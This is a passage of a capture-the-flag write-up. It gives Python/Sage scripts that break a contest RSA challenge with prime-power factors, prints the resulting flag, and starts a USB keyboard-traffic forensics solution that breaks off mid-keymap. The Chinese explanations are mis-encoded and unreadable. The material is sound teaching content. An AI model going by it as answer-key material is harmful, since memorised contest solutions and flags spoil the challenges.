= <span class="hljs-built_in">int</span>(next_prime(base + j))<br>    <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>        <span class="hljs-comment">#print(f&#x27;base=&#123;base&#125;\n&#x27;)</span><br>        <span class="hljs-keyword">if</span> p <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> p_list:<br>            p_list.append(p)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p=<span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br>        <br><span class="hljs-built_in">print</span>(p_list)<br><br><br><span class="hljs-comment">#base=47890485652059026823698344598447161988085597568237568</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568251161</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568297951</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568338059</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568363667</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568398337</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568433917</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568484111</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568667099</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568729849</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç”¨ <code>n % (int(p)**int(j))</code> æ¥åˆ¤æ–­ <code>p</code> æ˜¯<code>n</code> çš„å‡ æ¬¡å¹‚ï¼Œå¦‚æœä½™æ•°ä¸ä¸º <code>0</code> é‚£ä¹ˆå¾ªç¯çš„<code>j</code> å°±æ˜¯å‡ æ¬¡å¹‚ã€‚å°† <code>p_list[i] ** mi[i]</code> æ·»åŠ åˆ°ä¸€ä¸ªæ–°åˆ—è¡¨ï¼Œåé¢æ·»åŠ åˆ¤æ–­ç›¸ä¹˜æ˜¯å¦ä¸º <code>n</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = [<span class="hljs-number">47890485652059026823698344598447161988085597568251161</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568297951</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568338059</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568363667</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568398337</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568433917</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568484111</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568667099</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568729849</span>]<br>mi = []<br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> n % (<span class="hljs-built_in">int</span>(p)**<span class="hljs-built_in">int</span>(j)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>çš„å¹‚ä¸ºï¼š<span class="hljs-subst">&#123;j-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>            mi.append(j-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> j==<span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>çš„å¹‚ä¸ºï¼š<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br>            mi.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(mi)<br><br>check = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi)):<br>    check *= p_list[i] ** mi[i]<br><span class="hljs-built_in">print</span>(check - n)<br></code></pre></td></tr></table></figure><p>æœ€åä¸€éƒ¨åˆ†æŠŠ <code>e</code>çš„å…¬å› æ•° <code>108</code>å»é™¤ä¹‹åï¼Œå‚è€ƒæ–‡ç« å†…å®¹ç”¨ <code>sage</code> çš„ <code>nth_root</code> ç›´æ¥å¼€æ ¹å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>c = <span class="hljs-number">29259244746260903447574448389058952310000390135231599667104954615635954705912759181552349897154663199516384757779582324312559110410628822220097857204989378367616522573650610718867075518776621505865327181301059226036067398269476892575801933638458560523584293063843890012581096233699743704556897984235725492806550009731913445801481786988321848320254380607620726887530437151238556482879159888862341096974129499878601309077513908335631417136332585391767849651968095851808312565329858938394084369711172343300695636449663297542069122814607488273607842533010193498547579501368165500427762712900139188279259336486273788664239339542187191374015805659616093967428577968683677885747775540903578723024681500272919689849253480672194507905399890280339044782040395397922973935735424691828624724029439840506402735626398047317544972966643810550593849196291833043243448655939654884418027006572740130515844853007135331296523599052132266288322473865775521953742444721612389547052020839760259179074124960827686670217980159612966767064088131176654212504654177367329044762238432531402899949096987765334061101859346928585114984440559379578507872401025874782849854603895110182401204202962118890563473961321104811452539667609870771280348801335004559132482743318366689808669972965573335905879806817618597010442262336079838039317609336210571773187461470707420797827741277982208089496339300646565067740673242728353659143107970717482392927903021102141779217003523105389389513154792904745687959335115429159530013641777064904216646895961910784920181748841104318013067029395394948190384737300533803009402182800702</span><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = [<span class="hljs-number">47890485652059026823698344598447161988085597568251161</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568297951</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568338059</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568363667</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568398337</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568433917</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568484111</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568667099</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568729849</span>]<br>mi = []<br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> n % (<span class="hljs-built_in">int</span>(p)**<span class="hljs-built_in">int</span>(j)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>çš„å¹‚ä¸ºï¼š<span class="hljs-subst">&#123;j-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>            mi.append(j-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> j==<span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>çš„å¹‚ä¸ºï¼š<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br>            mi.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(mi)<br><br>n_list = [p_list[i] ** mi[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi))]<br><span class="hljs-comment">#print(n_list)</span><br><span class="hljs-built_in">print</span>(reduce((<span class="hljs-keyword">lambda</span> x, y: x * y), n_list) - n)<br><br>e = <span class="hljs-number">57564</span><br><br>res=[]<br><br><span class="hljs-keyword">for</span> pi <span class="hljs-keyword">in</span> n_list:<br>    d = inverse(<span class="hljs-built_in">int</span>(e//<span class="hljs-number">108</span>),euler_phi(pi))<br>    m = <span class="hljs-built_in">pow</span>(c,d,pi)<br>    res.append(Zmod(pi)(m).nth_root(<span class="hljs-number">108</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">True</span>))<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">for</span> vc <span class="hljs-keyword">in</span> itertools.product(*res):<br>    _c = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> vc]<br>    m = long_to_bytes(<span class="hljs-built_in">int</span>(crt(_c, n_list)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> m:<br>        <span class="hljs-built_in">print</span>(m)<br><br><span class="hljs-comment">#flag&#123;U_ar3_The_K1ng_oF_rand0m_kin9Dom!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>å‰é¢æ˜¯å¸¸è§„é”®ç›˜æµé‡åˆ†æï¼Œåé¢æœ‰ç‚¹é‡è·¯å­ã€‚<br><code>tshark -r misc1.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># é¼ æ ‡æµé‡çš„è¯ len æ”¹ä¸º 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br></code></pre></td></tr></table></figure><p>å‘ç°å¯¼å‡ºçš„æ•°æ®ç¬¬ä¸€åˆ—æœ‰å¼‚å¸¸ï¼Œéƒ¨åˆ†ä¸º<code>20</code>ï¼Œå¸¸è§çš„é”®ç›˜æµé‡åˆ†æé¢˜ç›®ï¼Œå‡ä¸º<code>00</code> <code>01</code> <code>02</code>ç­‰ç±»å‹ï¼Œé‚æ‰‹åŠ¨å°†ç¬¬ä¸€åˆ—çš„<code>20</code>æ”¹ä¸º<code>02</code>å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br> <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span 